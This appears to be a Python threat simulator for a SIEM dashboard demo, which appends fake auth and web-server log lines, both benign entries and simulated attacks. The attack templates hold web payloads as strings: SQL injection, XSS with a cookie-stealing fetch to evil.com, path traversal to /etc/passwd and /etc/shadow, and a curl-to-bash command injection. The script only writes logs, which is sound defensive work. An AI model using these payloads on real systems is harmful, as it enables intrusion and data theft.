#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════════════════
 SIEM Log Parser  ·  Threat Simulator  ·  log-generator.py
 ─────────────────────────────────────────────────────────────────
 Continuously appends authentic-looking security log entries to
 logs/auth.log so the live dashboard can be demonstrated without
 real attack traffic.
 
 Run:  python log-generator.py
══════════════════════════════════════════════════════════════════
"""

import random
import time
import os
import sys
from datetime import datetime, timezone

# ── Path Setup ───────────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_PATH   = os.path.join(SCRIPT_DIR, "logs", "auth.log")

os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)

# ── Attacker IP Pool ─────────────────────────────────────────────────
ATTACKER_IPS = [
    "185.220.101.47", "45.33.32.156",  "198.51.100.22",
    "203.0.113.99",   "91.108.4.44",   "1.179.160.21",
    "104.21.14.55",   "172.16.31.99",  "10.0.0.200",
    "51.254.25.115",
]

LEGIT_USERS = ["alice", "bob", "charlie", "devops", "sysadmin", "ci-runner"]
SERVICES    = ["sshd", "apache2", "nginx", "mysql", "postfix"]

# ── Timestamp Helper ─────────────────────────────────────────────────
def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def rip():
    return random.choice(ATTACKER_IPS)

def write(line: str):
    """Append one line to auth.log and echo to console."""
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(line + "\n")
    print(f"  → {line}")

# ── Scenario Generators ──────────────────────────────────────────────

def benign_lines(count: int = 5):
    """Write normal, non-threatening log entries."""
    templates = [
        lambda: f"{ts()} INFO  sshd: Accepted publickey for {random.choice(LEGIT_USERS)} from {rip()} port {random.randint(49000, 65000)} ssh2",
        lambda: f"{ts()} INFO  Connection closed by authenticating user {random.choice(LEGIT_USERS)} {rip()} port {random.randint(49000, 65000)} [preauth]",
        lambda: f"{ts()} INFO  session opened for user {random.choice(LEGIT_USERS)} by (uid=0)",
        lambda: f"{ts()} INFO  New session 42 of user {random.choice(LEGIT_USERS)}.",
        lambda: f"{ts()} INFO  {random.choice(SERVICES)}: Received SIGHUP; re-reading configuration.",
        lambda: f'{ts()} INFO  127.0.0.1 - - "GET /health HTTP/1.1" 200 24',
        lambda: f"{ts()} DEBUG kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode.",
    ]
    for _ in range(count):
        write(random.choice(templates)())
        time.sleep(random.uniform(0.15, 0.4))

def ssh_brute_force(ip: str | None = None, attempts: int = 12):
    """Simulate an SSH brute-force wave."""
    ip = ip or rip()
    users = ["root", "admin", "ubuntu", "pi", "user", "test", "mysql", "ftp"]
    print(f"\n  [SCENARIO] SSH Brute-Force from {ip} ({attempts} attempts)")
    for i in range(attempts):
        user = random.choice(users)
        port = random.randint(49000, 65000)
        invalid = "invalid user " if random.random() > 0.4 else ""
        write(f"{ts()} WARN  sshd[{random.randint(1000,9999)}]: Failed password for {invalid}{user} from {ip} port {port} ssh2")
        time.sleep(random.uniform(0.05, 0.2))

def sqli_attack(ip: str | None = None):
    """Simulate a SQL injection attempt in an Apache access log."""
    ip = ip or rip()
    payloads = [
        "GET /index.php?id=' UNION SELECT null,username,password FROM users-- HTTP/1.1",
        "GET /search?q=1' OR '1'='1 HTTP/1.1",
        "GET /login?user=admin'-- HTTP/1.1",
        "POST /api/data body=SELECT * FROM information_schema.tables HTTP/1.1",
        "GET /products?cat=1 UNION ALL SELECT null,null,table_name FROM information_schema.tables-- HTTP/1.1",
        "GET /items?id=1;DROP TABLE users;-- HTTP/1.1",
    ]
    payload = random.choice(payloads)
    print(f"\n  [SCENARIO] SQL Injection from {ip}")
    write(f'{ts()} WARN  apache2: {ip} - - "{payload}" 500 312')

def xss_attack(ip: str | None = None):
    """Simulate a Cross-Site Scripting payload in a web log."""
    ip = ip or rip()
    payloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(document.cookie)>',
        '<svg onload=fetch("https://evil.com/steal?c="+document.cookie)>',
        'javascript:alert(1)',
        '<iframe src=javascript:alert("XSS")></iframe>',
    ]
    payload = random.choice(payloads)
    print(f"\n  [SCENARIO] XSS Attack from {ip}")
    write(f'{ts()} WARN  nginx: {ip} - - "POST /comment?content={payload} HTTP/1.1" 200 88')

def path_traversal_attack(ip: str | None = None):
    """Simulate a path traversal / LFI attempt."""
    ip = ip or rip()
    payloads = [
        "GET /download?file=../../../../etc/passwd HTTP/1.1",
        "GET /view?page=../../etc/shadow HTTP/1.1",
        "GET /include?path=..\\..\\win.ini HTTP/1.1",
        "GET /file?name=../../../../proc/self/environ HTTP/1.1",
        "GET /read?path=../../boot.ini HTTP/1.1",
    ]
    payload = random.choice(payloads)
    print(f"\n  [SCENARIO] Path Traversal from {ip}")
    write(f'{ts()} WARN  apache2: {ip} - - "{payload}" 403 152')

def command_injection(ip: str | None = None):
    """Simulate a command injection attack log."""
    ip = ip or rip()
    payloads = [
        "GET /ping?host=localhost;whoami HTTP/1.1",
        "GET /exec?cmd=|ls+-la+/etc HTTP/1.1",
        'GET /run?input=$(curl+http://evil.com/shell.sh|bash) HTTP/1.1',
        "POST /api/run body=`id` HTTP/1.1",
    ]
    payload = random.choice(payloads)
    print(f"\n  [SCENARIO] Command Injection from {ip}")
    write(f'{ts()} CRIT  nginx: {ip} - - "{payload}" 200 256')

def scanner_detection(ip: str | None = None):
    """Simulate detection of an automated scanner."""
    ip = ip or rip()
    tools = ["Nmap", "masscan", "nikto", "sqlmap", "gobuster", "hydra", "dirb", "ZAP"]
    tool  = random.choice(tools)
    print(f"\n  [SCENARIO] Scanner ({tool}) from {ip}")
    write(f'{ts()} WARN  fail2ban: {ip} - - "User-Agent: {tool}/1.0 scanning" 400 0')

# ── Main Loop ─────────────────────────────────────────────────────────

SCENARIOS = [
    (ssh_brute_force,       4),   # weight 4 — most common
    (sqli_attack,           3),
    (xss_attack,            3),
    (path_traversal_attack, 2),
    (command_injection,     2),
    (scanner_detection,     1),
]

def weighted_choice(scenarios):
    pool = []
    for fn, weight in scenarios:
        pool.extend([fn] * weight)
    return random.choice(pool)

def main():
    print("""
  ╔══════════════════════════════════════════════════════╗
  ║   SIEM Threat Simulator  ·  log-generator.py         ║
  ║   Writing to: logs/auth.log                          ║
  ║   Press Ctrl+C to stop                               ║
  ╚══════════════════════════════════════════════════════╝
""")

    cycle = 0
    try:
        while True:
            cycle += 1
            print(f"\n{'─'*54}")
            print(f"  Cycle #{cycle}  |  {ts()}")
            print(f"{'─'*54}")

            # 1. Write a few benign lines first
            benign_lines(random.randint(2, 6))

            # 2. Execute a random attack scenario
            scenario_fn = weighted_choice(SCENARIOS)
            scenario_fn()

            # 3. More benign cooldown lines
            benign_lines(random.randint(1, 3))

            # 4. Occasionally fire two attacks in quick succession
            if random.random() < 0.25:
                print(f"\n  [BURST] Firing second scenario!")
                weighted_choice(SCENARIOS)()

            wait = random.uniform(3.0, 6.5)
            print(f"\n  Next cycle in {wait:.1f}s …")
            time.sleep(wait)

    except KeyboardInterrupt:
        print("\n\n  [STOPPED] Threat simulator terminated.\n")
        sys.exit(0)

if __name__ == "__main__":
    main()
